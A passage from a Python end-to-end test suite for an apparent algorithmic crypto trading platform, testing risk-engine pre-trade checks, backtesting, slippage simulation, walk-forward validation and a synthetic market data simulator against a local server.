            status, body = alice.get("/api/v1/admin/platform-stats")
            assert_status(status, 200, body, "stats")
            assert body["users"] >= 2
            assert body["strategies"] >= 2
            assert body["backtest_jobs"] >= 1
            info(f"Users: {body['users']} | Strategies: {body['strategies']} | "
                 f"Backtests: {body['backtest_jobs']} | Listings: {body['marketplace_listings']}")

        def health_endpoint():
            status, body = self.api.get("/health")
            assert_status(status, 200, body, "health")
            assert body["status"] == "ok"
            assert body["uptime_s"] >= 0

        self._run("Platform stats", platform_stats)
        self._run("Health endpoint", health_endpoint)

    # ─────────────────────────────────────────────
    # UC-16  Risk Engine Direct Tests
    # ─────────────────────────────────────────────

    def test_uc16_risk_engine(self):
        section("UC-16  Risk Engine Pre-Trade Checks")

        def test_risk_passes_normal():
            from risk.engine import RiskEngine, StrategyRiskConfig, StrategyRiskState
            from sdk.models import OrderRequest, OrderSide, OrderType, Portfolio
            engine = RiskEngine()
            config = StrategyRiskConfig(
                strategy_id="test",
                max_order_size_usd=Decimal("5000"),
                min_order_size_usd=Decimal("10"),
                max_drawdown_pct=Decimal("20"),
                max_daily_loss_pct=Decimal("10"),
                max_open_orders=20,
            )
            state = StrategyRiskState(
                strategy_id="test",
                session_start_equity=Decimal("10000"),
                session_high_equity=Decimal("10000"),
                daily_start_equity=Decimal("10000"),
            )
            portfolio = Portfolio(
                strategy_id="test",
                base_currency="USDT",
                balances={"USDT": Decimal("10000")},
            )
            req = OrderRequest(
                symbol="BTCUSDT",
                side=OrderSide.BUY,
                order_type=OrderType.MARKET,
                quantity=Decimal("0.001"),
                idempotency_key="test-1",
                strategy_id="test",
            )
            result = engine.check_order(req, portfolio, config, state, Decimal("50000"), 0)
            assert result.approved, f"Should approve: {result.violation}"
            info(f"Normal order: APPROVED")

        def test_risk_blocks_oversized():
            from risk.engine import RiskEngine, StrategyRiskConfig, StrategyRiskState, RiskViolation
            from sdk.models import OrderRequest, OrderSide, OrderType, Portfolio
            engine = RiskEngine()
            config = StrategyRiskConfig(
                strategy_id="test",
                max_order_size_usd=Decimal("500"),
                min_order_size_usd=Decimal("10"),
                max_drawdown_pct=Decimal("20"),
                max_daily_loss_pct=Decimal("10"),
                max_open_orders=20,
            )
            state = StrategyRiskState(
                strategy_id="test",
                session_start_equity=Decimal("10000"),
                session_high_equity=Decimal("10000"),
                daily_start_equity=Decimal("10000"),
            )
            portfolio = Portfolio(strategy_id="test", base_currency="USDT",
                                  balances={"USDT": Decimal("10000")})
            req = OrderRequest(
                symbol="BTCUSDT", side=OrderSide.BUY, order_type=OrderType.MARKET,
                quantity=Decimal("1.0"),  # $50,000 >> $500 limit
                idempotency_key="test-2", strategy_id="test",
            )
            result = engine.check_order(req, portfolio, config, state, Decimal("50000"), 0)
            assert not result.approved
            assert result.violation == RiskViolation.ORDER_TOO_LARGE
            info(f"Oversized order: REJECTED ({result.violation.value})")

        def test_risk_blocks_drawdown():
            from risk.engine import RiskEngine, StrategyRiskConfig, StrategyRiskState, RiskViolation
            from sdk.models import OrderRequest, OrderSide, OrderType, Portfolio
            engine = RiskEngine()
            config = StrategyRiskConfig(
                strategy_id="test",
                max_order_size_usd=Decimal("5000"),
                min_order_size_usd=Decimal("10"),
                max_drawdown_pct=Decimal("10"),   # 10% max drawdown
                max_daily_loss_pct=Decimal("20"),
                max_open_orders=20,
            )
            state = StrategyRiskState(
                strategy_id="test",
                session_start_equity=Decimal("10000"),
                session_high_equity=Decimal("10000"),
                daily_start_equity=Decimal("10000"),
            )
            portfolio = Portfolio(strategy_id="test", base_currency="USDT",
                                  balances={"USDT": Decimal("8500")})  # 15% down
            req = OrderRequest(
                symbol="BTCUSDT", side=OrderSide.BUY, order_type=OrderType.MARKET,
                quantity=Decimal("0.001"), idempotency_key="test-3", strategy_id="test",
            )
            result = engine.check_order(req, portfolio, config, state, Decimal("50000"), 0)
            assert not result.approved
            assert result.violation == RiskViolation.MAX_DRAWDOWN_EXCEEDED
            info(f"Drawdown breach: REJECTED ({result.violation.value})")

        def test_kill_switch():
            from risk.engine import RiskEngine, StrategyRiskConfig, StrategyRiskState, RiskViolation
            from sdk.models import OrderRequest, OrderSide, OrderType, Portfolio
            engine = RiskEngine()
            engine.activate_platform_kill_switch()
            config = StrategyRiskConfig(
                strategy_id="test",
                max_order_size_usd=Decimal("5000"),
                min_order_size_usd=Decimal("10"),
                max_drawdown_pct=Decimal("20"),
                max_daily_loss_pct=Decimal("20"),
                max_open_orders=20,
            )
            state = StrategyRiskState(
                strategy_id="test", session_start_equity=Decimal("10000"),
                session_high_equity=Decimal("10000"), daily_start_equity=Decimal("10000"),
            )
            portfolio = Portfolio(strategy_id="test", base_currency="USDT",
                                  balances={"USDT": Decimal("10000")})
            req = OrderRequest(
                symbol="BTCUSDT", side=OrderSide.BUY, order_type=OrderType.MARKET,
                quantity=Decimal("0.001"), idempotency_key="test-4", strategy_id="test",
            )
            result = engine.check_order(req, portfolio, config, state, Decimal("50000"), 0)
            assert not result.approved
            assert result.violation == RiskViolation.KILL_SWITCH_ACTIVE
            engine.deactivate_platform_kill_switch()
            info("Kill switch: ALL orders blocked, then released")

        self._run("Normal order approved", test_risk_passes_normal)
        self._run("Oversized order rejected", test_risk_blocks_oversized)
        self._run("Drawdown breach rejected", test_risk_blocks_drawdown)
        self._run("Kill switch blocks everything", test_kill_switch)

    # ─────────────────────────────────────────────
    # UC-17  Backtest Engine Unit Tests
    # ─────────────────────────────────────────────

    def test_uc17_backtest_engine_direct(self):
        section("UC-17  Backtest Engine (Direct)")
        import asyncio

        def ema_crossover_runs():
            from sdk.examples import MACrossoverStrategy
            from backtesting.engine import BacktestEngine, BacktestConfig
            from sdk.models import Bar
            from coindcx_platform.market_sim import MarketSimulator, SimConfig

            sim = MarketSimulator(SimConfig(symbol="BTCUSDT", seed=42))
            bars_data = sim.generate_bars("BTCUSDT", "1h",
                                         int(time.time() * 1000) - 200 * 3600000,
                                         int(time.time() * 1000))
            bars = [Bar(
                symbol=b["symbol"], open=Decimal(str(b["open"])),
                high=Decimal(str(b["high"])), low=Decimal(str(b["low"])),
                close=Decimal(str(b["close"])), volume=Decimal(str(b["volume"])),
                timestamp_ms=b["timestamp_ms"], resolution=b["resolution"],
            ) for b in bars_data]

            config = BacktestConfig(
                strategy_class=MACrossoverStrategy,
                strategy_params={"fast_period": 9, "slow_period": 21, "quantity": "0.001"},
                symbol="BTCUSDT", resolution="1h",
                start_ms=bars[0].timestamp_ms, end_ms=bars[-1].timestamp_ms,
                initial_capital=Decimal("10000"),
                simulate_latency=False,
            )
            result = asyncio.get_event_loop().run_until_complete(
                BacktestEngine(config).run(bars)
            )
            assert result.bars_processed == len(bars)
            assert result.metrics is not None
            assert len(result.equity_curve) == len(bars)
            info(f"Processed {result.bars_processed} bars | Trades: {result.metrics.total_trades} | "
                 f"Return: {result.metrics.total_return_pct:.2f}%")

        def fill_simulator_market_slippage():
            from backtesting.engine import FillSimulator, BacktestConfig
            from sdk.examples import MACrossoverStrategy
            from sdk.models import Bar, OrderRequest, OrderSide, OrderType

            config = BacktestConfig(
                strategy_class=MACrossoverStrategy, strategy_params={},
                symbol="BTCUSDT", resolution="1h", start_ms=0, end_ms=0,
                slippage_pct=Decimal("0.001"),
            )
            sim = FillSimulator(config)
            bar = Bar(symbol="BTCUSDT", open=Decimal("50000"), high=Decimal("51000"),
                      low=Decimal("49000"), close=Decimal("50500"),
                      volume=Decimal("100"), timestamp_ms=0, resolution="1h")
            req = OrderRequest(symbol="BTCUSDT", side=OrderSide.BUY,
                               order_type=OrderType.MARKET, quantity=Decimal("0.001"))
            price, qty = sim.simulate_market_fill(req, bar)
            assert price > Decimal("50000"), f"Buy should fill above open, got {price}"
            assert qty == Decimal("0.001")
            info(f"Market buy: open=50000, fill={price} (slippage applied)")

        def walk_forward_validation():
            from sdk.examples import MACrossoverStrategy
            from backtesting.engine import WalkForwardValidator
            from sdk.models import Bar
            from coindcx_platform.market_sim import MarketSimulator, SimConfig

            sim = MarketSimulator(SimConfig(symbol="BTCUSDT", seed=42))
            bars_data = sim.generate_bars("BTCUSDT", "1h",
                                         int(time.time() * 1000) - 500 * 3600000,
                                         int(time.time() * 1000))
            bars = [Bar(
                symbol=b["symbol"], open=Decimal(str(b["open"])),
                high=Decimal(str(b["high"])), low=Decimal(str(b["low"])),
                close=Decimal(str(b["close"])), volume=Decimal(str(b["volume"])),
                timestamp_ms=b["timestamp_ms"], resolution=b["resolution"],
            ) for b in bars_data]

            wf = WalkForwardValidator(
                strategy_class=MACrossoverStrategy,
                base_params={"fast_period": 9, "slow_period": 21, "quantity": "0.001"},
                all_bars=bars,
                train_pct=0.7,
                n_folds=3,
            )
            loop = asyncio.new_event_loop()
            results = loop.run_until_complete(wf.run())
            loop.close()
            assert len(results) == 3
            for r in results:
                assert hasattr(r, "metrics")
                assert r.metrics is not None
            avg_ret = sum(r.metrics.total_return_pct for r in results) / 3
            info(f"Walk-forward: 3 folds | Avg test return: {avg_ret:.2f}%")

        self._run("EMA Crossover backtest runs", ema_crossover_runs)
        self._run("Fill simulator applies slippage", fill_simulator_market_slippage)
        self._run("Walk-forward validation (3 folds)", walk_forward_validation)

    # ─────────────────────────────────────────────
    # UC-18  Market Simulator
    # ─────────────────────────────────────────────

    def test_uc18_market_simulator(self):
        section("UC-18  Market Data Simulator")

        def generates_realistic_bars():
            from coindcx_platform.market_sim import MarketSimulator, SimConfig
            sim = MarketSimulator(SimConfig(symbol="ETHUSDT", initial_price=3000, seed=1))
            start_ms = int(time.time() * 1000) - 100 * 3600000
            end_ms = int(time.time() * 1000)
            bars = sim.generate_bars("ETHUSDT", "1h", start_ms, end_ms)
            assert len(bars) == 100
            for bar in bars:
                assert bar["high"] >= bar["open"] >= 0
                assert bar["high"] >= bar["close"] >= 0
                assert bar["high"] >= bar["low"] >= 0
                assert bar["volume"] > 0
            prices = [b["close"] for b in bars]
            info(f"100 ETH bars: min=${min(prices):,.0f} max=${max(prices):,.0f}")

        def generates_correlated_multi_asset():
            from coindcx_platform.market_sim import generate_multi_asset_bars
            data = generate_multi_asset_bars(
                symbols=["BTCUSDT", "ETHUSDT", "SOLUSDT"],
                resolution="1h", n_bars=50,
                correlations={"ETHUSDT": 0.8, "SOLUSDT": 0.6},
                seed=42,
            )
            assert "BTCUSDT" in data
            assert "ETHUSDT" in data
            assert len(data["BTCUSDT"]) == 50
            info(f"Multi-asset: {len(data)} symbols × 50 bars each")

        def orderbook_bid_ask_spread():
            from coindcx_platform.market_sim import MarketSimulator
            sim = MarketSimulator()
            ob = sim.generate_orderbook("BTCUSDT", 50000.0, depth=10)
            assert ob["bids"][0]["price"] < ob["asks"][0]["price"]
            assert len(ob["bids"]) == 10
            info(f"Order book spread: ${ob['asks'][0]['price'] - ob['bids'][0]['price']:.2f}")

        self._run("Generates valid OHLCV bars", generates_realistic_bars)
        self._run("Correlated multi-asset data", generates_correlated_multi_asset)
        self._run("Order book bid/ask spread valid", orderbook_bid_ask_spread)

    # ─────────────────────────────────────────────
    # Runner
    # ─────────────────────────────────────────────

    def run_all(self) -> bool:
        header("CoinDCX Algo Platform — E2E Test Suite")
        print(f"  Target: {BASE_URL}")
        print(f"  Started: {time.strftime('%Y-%m-%d %H:%M:%S')}")

        test_groups = [
            ("Authentication", self.test_uc01_auth),
            ("Strategy Management", self.test_uc02_strategy_creation),
            ("Code Validation", self.test_uc03_code_validation),
            ("Backtesting", self.test_uc04_backtesting),
            ("Multiple Strategies", self.test_uc05_second_strategy),
            ("Paper Trading", self.test_uc06_paper_trading),
            ("Live Trading", self.test_uc07_live_trading),
            ("Stop Deployment", self.test_uc08_stop_deployment),
            ("Market Data", self.test_uc09_market_data),
            ("Analytics", self.test_uc10_analytics),
            ("Marketplace Publish", self.test_uc11_marketplace_publish),
            ("Copy Trading", self.test_uc12_copy_trading),
            ("Audit Log", self.test_uc13_audit_log),
            ("Multi-User Isolation", self.test_uc14_multi_user_isolation),
            ("Admin Stats", self.test_uc15_admin_stats),
            ("Risk Engine", self.test_uc16_risk_engine),
            ("Backtest Engine", self.test_uc17_backtest_engine_direct),
            ("Market Simulator", self.test_uc18_market_simulator),
        ]

        for group_name, fn in test_groups:
            try:
                fn()
            except Exception as e:
                fail(f"[GROUP CRASH] {group_name}", str(e))
                traceback.print_exc()

        return self.results.summary()


def main():
    Platform.reset()
    server = run_server(host="127.0.0.1", port=18765)
    time.sleep(0.3)  # Let server start

    suite = E2ETestSuite()
    success = suite.run_all()

    server.shutdown()
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
